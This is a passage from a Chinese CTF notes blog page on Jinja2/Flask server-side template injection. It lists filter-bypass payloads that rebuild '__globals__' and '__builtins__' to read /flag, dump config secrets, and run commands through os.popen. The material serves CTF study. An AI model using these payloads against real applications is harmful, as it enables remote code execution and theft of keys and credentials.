+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">dict：dict函数在创造字典时python会自动把赋值对象看成字符串<br>例：dict(name=1)直接生成&#123;&quot;name&quot;:1&#125;<br>join：对字典使用join时，join会把字典的所有键拼接成一个字符串，所以dict(po=a,p=a)|join可以生成&quot;pop&quot;，而a是占位符随便写<br><br>&#123;% set po=dict(po=a,p=a)|join%&#125;			&#123;#设置po为pop#&#125;<br>&#123;% set a=(()|select|string|list)|attr(po)(24)%&#125;	&#123;#&#123;&#123;()|select&#125;&#125;为&lt;generator object select_or_reject at 0x7fbdb99af220&gt;，pop(24)正好时下划线#&#125;<br>&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125; &#123;#设置ini为__init__#&#125;<br>&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;	&#123;#设置glo为__globals__#&#125;<br>&#123;% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;	&#123;#设置geti为__getitem__#&#125;<br>&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;	&#123;#设置built为__builtins__#&#125;<br>&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;#设置x为q.__ini__.__globals__.__getitem__(&#x27;__builtins&#x27;)#&#125;<br>&#123;% set chr=x.chr%&#125;	&#123;#提取__builtins__中的chr函数#&#125;<br>&#123;% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%&#125;&#123;#构造文件路径/flag#&#125;<br>&#123;%print(x.open(file).read())%&#125;&#123;#利用__builtins__.open(&#x27;/flag&#x27;).read()读取文件内容#&#125;<br><br><br>数字被过滤可以用count如&#123;%set n=(dict(cccc=a)|join)|count%&#125;将n赋值为4<br>length：count被过滤可以用length替换，jinja2的length和count完全等价<br><br><br><br><br>&#123;%print(lipsum|string|list)%&#125;<br>输出：<br>[&#x27;&lt;&#x27;, &#x27;f&#x27;, &#x27;u&#x27;, &#x27;n&#x27;, &#x27;c&#x27;, &#x27;t&#x27;, &#x27;i&#x27;, &#x27;o&#x27;, &#x27;n&#x27;, &#x27; &#x27;, &#x27;g&#x27;, &#x27;e&#x27;, &#x27;n&#x27;, &#x27;e&#x27;, &#x27;r&#x27;, &#x27;a&#x27;, &#x27;t&#x27;, &#x27;e&#x27;, &#x27;_&#x27;, &#x27;l&#x27;, &#x27;o&#x27;, &#x27;r&#x27;, &#x27;e&#x27;, &#x27;m&#x27;, &#x27;_&#x27;, &#x27;i&#x27;, &#x27;p&#x27;, &#x27;s&#x27;, &#x27;u&#x27;, &#x27;m&#x27;, &#x27; &#x27;, &#x27;a&#x27;, &#x27;t&#x27;, &#x27; &#x27;, &#x27;0&#x27;, &#x27;x&#x27;, &#x27;7&#x27;, &#x27;f&#x27;, &#x27;6&#x27;, &#x27;b&#x27;, &#x27;f&#x27;, &#x27;3&#x27;, &#x27;e&#x27;, &#x27;4&#x27;, &#x27;c&#x27;, &#x27;5&#x27;, &#x27;5&#x27;, &#x27;0&#x27;, &#x27;&gt;&#x27;]<br>而我们要在这些字符中把我们想要的一个个拼起来<br>例：<br>&#123;%set gl=(((lipsum|string|list).pop(18))~((lipsum|string|list).pop(18))~((lipsum|string|list).pop(10))~((lipsum|string|list).pop(19))~((lipsum|string|list).pop(7))~((lipsum|string|list).pop(40))~((lipsum|string|list).pop(31))~((lipsum|string|list).pop(19))~((lipsum|string|list).pop(27))~((lipsum|string|list).pop(18))~((lipsum|string|list).pop(18)))%&#125;<br>&#123;%print(lipsum|attr(gl))%&#125;<br>gl为__globals__<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+框架内置对象(Flask/Jinja2特有)
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">不需要从&#x27;&#x27;出发，直接在模板中就能拿到的对象<br>config:泄露SECRET_KEY、数据库连接密码&#123;&#123;config&#125;&#125;<br>request:利用请求对象&#123;&#123;request.application.__self__._get_data_for_json.__globals__[&#x27;os&#x27;].popen(&#x27;id&#x27;).read()&#125;&#125;<br>url_for/get_flashed_messages:&#123;&#123;url_for.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://lengkur.github.io">Lengkur</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://lengkur.github.io/2026/01/24/notes/SSTI/">http://lengkur.github.io/2026/01/24/notes/SSTI/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://lengkur.github.io" target="_blank">Lengkur</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/comeboy2.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/01/24/notes/SQL/" title="SQL"><img class="cover" src="/img/comeboy2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">SQL</div></div><div class="info-2"><div class="info-item-1">在 SQL 中，数字和字符串的比较是弱类型的，如果在比...</div></div></div></a><a class="pagination-related" href="/2026/01/24/notes/SSRF/" title="SSRF"><img class="cover" src="/img/comeboy2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">SSRF</div></div><div class="info-2"><div class="info-item-1">构造http请求时必须在每一句后面加上\r\n，结束时...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/lengkur.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Lengkur</div><div class="author-info-description">Web Security / CTF Player / Bug Hunter</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">70</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lengkur"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/lengkur" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:guo374655@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Everything is vulnerable</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/24/wp/ctfshow/web330-%E5%AD%98%E5%82%A8%E5%9E%8BXSS-GET-%E9%92%93%E9%B1%BC/" title="web330-存储型XSS-GET-钓鱼"><img src="/img/stargirl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="web330-存储型XSS-GET-钓鱼"/></a><div class="content"><a class="title" href="/2026/01/24/wp/ctfshow/web330-%E5%AD%98%E5%82%A8%E5%9E%8BXSS-GET-%E9%92%93%E9%B1%BC/" title="web330-存储型XSS-GET-钓鱼">web330-存储型XSS-GET-钓鱼</a><time datetime="2026-01-24T06:52:37.000Z" title="发表于 2026-01-24 14:52:37">2026-01-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/24/wp/NSSCTF%20WEB/%5BDe1ctf%202019%5DSSRF%20Me-Flask/" title="[De1ctf 2019]SSRF Me-Flask"><img src="/img/catgirl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[De1ctf 2019]SSRF Me-Flask"/></a><div class="content"><a class="title" href="/2026/01/24/wp/NSSCTF%20WEB/%5BDe1ctf%202019%5DSSRF%20Me-Flask/" title="[De1ctf 2019]SSRF Me-Flask">[De1ctf 2019]SSRF Me-Flask</a><time datetime="2026-01-24T06:52:37.000Z" title="发表于 2026-01-24 14:52:37">2026-01-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/24/wp/furryctf/DeepSleep-py2%E7%9A%84input-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87/" title="DeepSleep-py2的input-双写绕过"><img src="/img/Arch.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DeepSleep-py2的input-双写绕过"/></a><div class="content"><a class="title" href="/2026/01/24/wp/furryctf/DeepSleep-py2%E7%9A%84input-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87/" title="DeepSleep-py2的input-双写绕过">DeepSleep-py2的input-双写绕过</a><time datetime="2026-01-24T06:52:37.000Z" title="发表于 2026-01-24 14:52:37">2026-01-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/24/wp/ctfshow/web171-SQL%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88/" title="web171-SQL注入-联合"><img src="/img/stargirl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="web171-SQL注入-联合"/></a><div class="content"><a class="title" href="/2026/01/24/wp/ctfshow/web171-SQL%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88/" title="web171-SQL注入-联合">web171-SQL注入-联合</a><time datetime="2026-01-24T06:52:37.000Z" title="发表于 2026-01-24 14:52:37">2026-01-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/24/wp/ctfshow/web371-ssti-print%E8%BF%87%E6%BB%A4-%E4%B8%8B%E5%88%92%E7%BA%BF-%E5%BC%95%E5%8F%B7-%E6%95%B0%E5%AD%97/" title="web371-ssti-print过滤-下划线-引号-数字"><img src="/img/stargirl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="web371-ssti-print过滤-下划线-引号-数字"/></a><div class="content"><a class="title" href="/2026/01/24/wp/ctfshow/web371-ssti-print%E8%BF%87%E6%BB%A4-%E4%B8%8B%E5%88%92%E7%BA%BF-%E5%BC%95%E5%8F%B7-%E6%95%B0%E5%AD%97/" title="web371-ssti-print过滤-下划线-引号-数字">web371-ssti-print过滤-下划线-引号-数字</a><time datetime="2026-01-24T06:52:37.000Z" title="发表于 2026-01-24 14:52:37">2026-01-24</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Lengkur</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4-b1"></script><script src="/js/main.js?v=5.5.4-b1"></script><div class="js-pjax"></div><link rel="stylesheet" href="/js/imgloaded.js"><link rel="stylesheet" href="/js/universe.js"><script src="/js/universe.js"></script><script id="canvas_nest" defer="defer" color="100,100,100" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/click-show-text.min.js" data-mobile="false" data-text="SQL,Javascript,Flask,HTTP,XSS,SSRF,CSRF,SSTI,Struct2,文件上传,文件包含,信息搜集,PHP,反序列化" data-fontsize="20px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_swiper_injector_config(){
+    var parent_div_git = document.getElementById('recent-posts');
+    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/01/24/wp/ctfshow/web185-sql-布尔盲注-引号过滤-数字过滤-=过滤/" alt=""><img width="48" height="48" src="/img/stargirl.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-01-24</span><a class="blog-slider__title" href="2026/01/24/wp/ctfshow/web185-sql-布尔盲注-引号过滤-数字过滤-=过滤/" alt="">web185-sql-布尔盲注-引号过滤-数字过滤-=过滤</a><div class="blog-slider__text">这里的描述可以随便写</div><a class="blog-slider__button" href="2026/01/24/wp/ctfshow/web185-sql-布尔盲注-引号过滤-数字过滤-=过滤/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/01/24/wp/ctfshow/web371-ssti-print过滤-下划线-引号-数字/" alt=""><img width="48" height="48" src="/img/stargirl.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-01-24</span><a class="blog-slider__title" href="2026/01/24/wp/ctfshow/web371-ssti-print过滤-下划线-引号-数字/" alt="">web371-ssti-print过滤-下划线-引号-数字</a><div class="blog-slider__text">这里的描述可以随便写</div><a class="blog-slider__button" href="2026/01/24/wp/ctfshow/web371-ssti-print过滤-下划线-引号-数字/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/01/24/wp/三届长城杯/AI_WAF/" alt=""><img width="48" height="48" src="/img/Arch.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-01-24</span><a class="blog-slider__title" href="2026/01/24/wp/三届长城杯/AI_WAF/" alt="">AI_WAF</a><div class="blog-slider__text">这里的描述可以随便写</div><a class="blog-slider__button" href="2026/01/24/wp/三届长城杯/AI_WAF/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/01/24/wp/furryctf/固若金汤-热身题-session伪造-flask-ssti/" alt=""><img width="48" height="48" src="/img/Arch.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-01-24</span><a class="blog-slider__title" href="2026/01/24/wp/furryctf/固若金汤-热身题-session伪造-flask-ssti/" alt="">固若金汤-热身题-session伪造-flask-ssti</a><div class="blog-slider__text">这里的描述可以随便写</div><a class="blog-slider__button" href="2026/01/24/wp/furryctf/固若金汤-热身题-session伪造-flask-ssti/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/01/24/wp/NSSCTF WEB/[NISACTF 2022]level-up~robots-md5强碰撞-sha1强碰撞-php变量解析绕过-create_function绕过/" alt=""><img width="48" height="48" src="/img/catgirl.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-01-24</span><a class="blog-slider__title" href="2026/01/24/wp/NSSCTF WEB/[NISACTF 2022]level-up~robots-md5强碰撞-sha1强碰撞-php变量解析绕过-create_function绕过/" alt="">[NISACTF 2022]level-up~robots-md5强碰撞-sha1强碰撞-php变量解析绕过-create_function绕过</a><div class="blog-slider__text">这里的描述可以随便写</div><a class="blog-slider__button" href="2026/01/24/wp/NSSCTF WEB/[NISACTF 2022]level-up~robots-md5强碰撞-sha1强碰撞-php变量解析绕过-create_function绕过/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/01/24/wp/NSSCTF WEB/[WUSTCTF 2020]朴实无华-信息搜集-MD5弱比较-intval特性-命令执行-空格绕过/" alt=""><img width="48" height="48" src="/img/catgirl.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-01-24</span><a class="blog-slider__title" href="2026/01/24/wp/NSSCTF WEB/[WUSTCTF 2020]朴实无华-信息搜集-MD5弱比较-intval特性-命令执行-空格绕过/" alt="">[WUSTCTF 2020]朴实无华-信息搜集-MD5弱比较-intval特性-命令执行-空格绕过</a><div class="blog-slider__text">这里的描述可以随便写</div><a class="blog-slider__button" href="2026/01/24/wp/NSSCTF WEB/[WUSTCTF 2020]朴实无华-信息搜集-MD5弱比较-intval特性-命令执行-空格绕过/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/01/24/wp/DASCTF/DASCTF-web1/" alt=""><img width="48" height="48" src="/img/Arch.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-01-24</span><a class="blog-slider__title" href="2026/01/24/wp/DASCTF/DASCTF-web1/" alt="">DASCTF-web1</a><div class="blog-slider__text">这里的描述可以随便写</div><a class="blog-slider__button" href="2026/01/24/wp/DASCTF/DASCTF-web1/" alt="">详情   </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
+    console.log('已挂载butterfly_swiper')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'undefined'.split(',');
+  var cpage = location.pathname;
+  var epage = '/';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_swiper_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_swiper_injector_config();
+  }
+  </script><script defer src="https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiper_init.js"></script><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '1s');
+    arr[i].setAttribute('data-wow-delay', '0s');
+    arr[i].setAttribute('data-wow-offset', '100');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script></div><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow_init.js"></script><!-- hexo injector body_end end --></body></html>
